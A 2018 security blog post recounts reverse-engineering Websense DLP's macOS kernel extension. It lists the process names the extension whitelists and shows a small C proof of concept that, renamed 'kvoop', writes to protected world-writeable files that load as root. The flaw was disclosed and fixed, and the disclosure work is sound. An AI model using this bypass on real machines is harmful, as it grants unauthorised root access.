---
layout: post
title:  'Websense DLP gives instant root'
author-id: isotopp
feature-img: assets/img/background/rijksmuseum.jpg
date: 2018-06-18 20:33:10 +0100
tags:
- lang_en
- security
- hack
---

Enterprise security software is interesting, because in order to do what it does it often uses privilege, but it is also very often written extremely badly.

In [ASLR]({% link _posts/2017-10-20-aslr.md %}) we have had a look on the Trend Micro binary on MacOS and found that it is running as root, and with ASLR off. That means we have a privileged process that is being loaded at a fixed address, and that process is parsing random user generated data in order to scan it for viruses. If we manage to find a bug in that code, we have a way to make this privileged process do our bidding – by simply putting a special file into a directory that is being scanned by the virus scanner.

Because ASLR is off, that antivirus process is at the same, fixed address on every machine running the same OS version and Trendmicro version. This means: our bug works the same way on every single machine with these properties. We basically control the entire fleet of machines at once.

Such thoughts are not hypothetical problems. Let's have a look at another enterprise security product and how that works, for real.

## Websense DLP is installed and it is Python

So yesterday morning when I came to work, my Macbook Air had crashed.

On Reboot, the jamf installed a bunch of patches and new stuff. I ran the usual fast [AIDE](https://aide.github.io/) check I do every morning, and found a bunch of modified system files, among them WebSense DLP as announced by Corporate a while ago.

I found a bunch of files in `/Library/Application Support/Websense Endpoint` and was immediately fascinated, because apparently this installs a complete version of Python 2.5.

```console
$ find . -iname python2\*
./EPClassifier/python/bin/python2.5
$ EPClassifier/python/bin/python2.5
Python 2.6.9 (unknown, Feb  7 2017, 00:08:08)
[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

Okay, so they lie about that. It’s 2.6.

On the other hand, they deliver their application as a bunch of `.pyc` (compiled python bytecode) files. 

```console
$ find  . -iname \*.pyc
./EPClassifier/CryptoInterface.pyc
./EPClassifier/policies/file_detectors/ASMDetector.pyc
./EPClassifier/policies/file_detectors/CAD_STL.pyc
...
```

We can read that, using [uncompyle6](https://github.com/rocky/python-uncompyle6): `brew install python3; pip3 install uncompyle6`, because I am lazy and don’t want to mess with a venv right here and now. 

I’d want that in my path all the time anyway.

```python
$ uncompyle6 ./EPClassifier/policies/scripts/pyLogger.pyc
# uncompyle6 version 3.2.3
# Python bytecode 2.5 (62131)
# Decompiled from: Python 3.7.0 (default, Jul  9 2018, 09:48:45)
# [Clang 9.0.0 (clang-900.0.39.2)]
# Embedded file name: .\pyLogger.py
import codecs, time, threading

class PyLogger(object):

    def __init__(self, debugName='', fileName='C:\\temp\\pyLogger_svm_default_log_file.txt'):
        self.debugName = debugName
        self.fileName = fileName
        self.myMutex = threading.Lock()

    def debug(self, massage_to_write):
        time_str = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime())
        string_to_write = '%s pyLogger debug message: %s' % (time_str, massage_to_write)
        self.myMutex.acquire()
        log_debug_file = codecs.open(self.fileName, 'a', 'utf-16')
        log_debug_file.write(string_to_write)
        log_debug_file.write('\r\n')
        log_debug_file.close()
        self.myMutex.release()
# okay decompiling ./EPClassifier/policies/scripts/pyLogger.pyc
```

## It's all world-writeable, or is it?

That’s fun, I thought and then I saw the file permissions.

```console
$ ls -l ./EPClassifier/policies/scripts/pyLogger.pyc
-rw-rw-rw-  1 root  admin  1130 Nov 14  2017 ./EPClassifier/policies/scripts/pyLogger.pyc
```

Is it really a good idea to have system security software installed with world-writeable files?

I asked in our internal security forum, and apparently WebSense has an anti-tampering protection. 

```console
$ kextstat | grep -v com.apple | awk '{ print $1, $6 }'
Index Name
15 com.displaylink.driver.DisplayLinkDriver
91 com.asix.driver.ax88179-178a
131 com.Cylance.CyProtectDrvOSX
146 com.websense.endpoint.process.kpi
147 com.websense.endpoint.process
148 com.websense.endpoint.dlp
```

The number 148, `com.websense.endpoint.dlp`, is the kernel module that "protects" these files: As a user or as root, when you try to modify one of the world writeable files, the module intercepts and blocks the call.

```console
com.websense.endpoint.dlp: [WARNING:ws_anti.c:364] Blocking the attempt to modify or delete /Library/Application Support/Websense Endpoint/EPClassifier/python/lib/python2.5/sqlite3/__init__.py, pid:73968, process:vim, action: 0x4
```

Challenge accepted.

## A kext is just code. Let's have a look.

```console
$ pwd
.../Websense Endpoint/DLP/WebsenseEndpointDLP.kext/Contents/MacOS
$ ls -l
total 440
-rwxr-xr-x  1 kris  staff  223056 Jun  4 23:52 WebsenseEndpointDLP
```

That’s the kext, the one which registers itself as `com.websense.endpoint.dlp` in `kextstat`.

We can load it into [Hopper](https://www.hopperapp.com/). Hopper is a $99 IDAPro Clone with a nice Python API. You can also use the free version of IDApro, or the NSA Ghidra to achieve the same.

Turns out, the kext is delivered with a full symbol table. Here is what you see when you start Hopper, drag the kext into it and click on the symbol that inits the kernel extension:

[![](/uploads/2018/06/hopper-01.jpg)](/uploads/2018/06/hopper-01.jpg)

*Initial glance at the kext after loading. We have symbols. That's almost like cheating.*

There is a tempting call to `_ws_anti_tampering_initialize()`, but I have learned to do things differently a long time ago. The error message read "Blocking the attempt to modify or delete". 

That's here:

[![](/uploads/2018/06/hopper-02.jpg)](/uploads/2018/06/hopper-02.jpg)

*Two places in vnode_listener_callback_9135*

We are looking at a vnode listener, which is a type of [kauth](https://www.apriorit.com/dev-blog/411-mac-os-x-kauth-listeners) listener, which is a MacOS thing to monitor or block access to files. It’s what all the Cybersnakeoil is using. It’s also what’s making your `git checkout` slow.

And here is the callback:

[![](/uploads/2018/06/hopper-03.jpg)](/uploads/2018/06/hopper-03.jpg)

*Read the highlighted code...*

There is little going on here until we hit the highlighted code. You can’t see all of it, but that does not matter.

The code calls [proc_name()](https://developer.apple.com/documentation/kernel/1488959-proc_name?language=objc), which gets the current process title in the kernel context. It then compares this name to a list of approved process names.

If there is a match, no blockage happens from the kext.

So, anything called

- EndPointClassifier
- kvoop
- CryptoTool
- InstallerTools
- Websense Endpoint
- TRITON AP-ENDPOINT
- Websense Endpoint Helper
- DLPHelperService
- efw_cache_update
- installd
- installer
- rc.deferred_install
- shove
- Google Chrome
- Websense Endpoint RF Notification

is approved to bypass the protection afforded by kext 148.

That makes a lot of sense, if you look at it - how are they going to update their code out in the world? Some programs must be allowed to write to it – that's how `InstallerTools`, `CryptoTool`, `installd`, `installer` and `rc.deferred_install` as well as `shove` end up on this list.

The others are likely convenience for Develoeprs that "accidentally" (through bad development processes) made it out into production code. It's likely that the bad permissions also ended up being shipped the same way – it makes a lot of sense for a developer to have these files world-writeable all the time when they are developing this product.

In any case, other rules in the rest of the kernel still apply, so file permissions still work. But WebSense delivered a bunch of files world-writeable, relying on their kext to protect their application.

They do load these world-writeable files into their python process, which runs as root, and happily execute them. So this is our hook: We overwrite any of these files with our own code, using our own program which we name `kvoop` (or anything from the list above), and then restart the machine. As it starts up, it loads our code and the box is ours.

We get privilege escalation from local user to system administrator.

## We write a proof-of-concept

Can I prove that I can circumvent their protection?

```c
$ cat probe.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    FILE *fp = fopen("version.plist", "w");
    if (!fp) {
        perror("Can't fopen\n");
       exit(1);
    }

    fprintf(fp, "Hello, world\n");
    fclose(fp);
    sleep(60);
    exit(0);
}
```

This is a slight variation of the “hello world” program: It opens a file version.plist, writes "Hello, world" to the file, sleeps a minute and exits.

First, expected behavior: Boy meets file, file is world writeable, boy tries to write file, and fails due to the kext doing the kauth thing and interfering.

Hackerterrorcybercyber averted.

```console
$ pwd
/Library/Application Support/Websense Endpoint/EPClassifier/python/Resources
$ ls -l version.plist 
-rwxrwxrwx 1 root admin 454 May 26 07:13 version.plist
$ > version.plist
-bash: version.plist: Permission denied
```

Boy reverses the kext, reads the list of privileged filenames, names his "hello world" program kvoop from the list of privileged filenames and lo and behold:

```console
$ kvoop
^C
$ cat version.plist
Hello, world
```

I pwn.

## Other observations

Websense DLP is one of the kind of products that inject a shared library (a Macos `.dylib`) into other processes. In our case, Chrome and Firefox are being targeted. This is not a stable interface, and [Chrome or Firefox may crash](https://www.techradar.com/news/google-chrome-keeps-crashing-it-might-be-your-antivirus).

Websense DLP relies on the `prog_name()` not only for exceptions in the kauth handler, but also in the selection of binaries to target for injection. For example, if I write a "hello world" program and rename it to `firefox`, there is a lot of commotion in the system log: Websense DLP tries to inject its libraries into my "hello world" program, which it mistakes for Firefox due to the program name, and fails, noisly.

The same works in reverse: A firefox binary that is not named `firefox` is not recognized and does not get the shared library injected, so it flies under the radar.

One wonders what the actual threat model is that this is supposed to protect against.

## TL;DR

We deployed Websense DLP across all company Macs, and anybody renaming their `vim` to `kvoop` can edit the files, which are then loaded into a privileged process and run as root. 

*Websense DLP is an instant root on all Mac machines where it is being deployed.*

*Addendum:* Security picked up on this, and communicated the problem to the vendor, which then shipped a fix. It is unknown to me if they also fixed their broken security processes. We ceased using the product shortly after that.
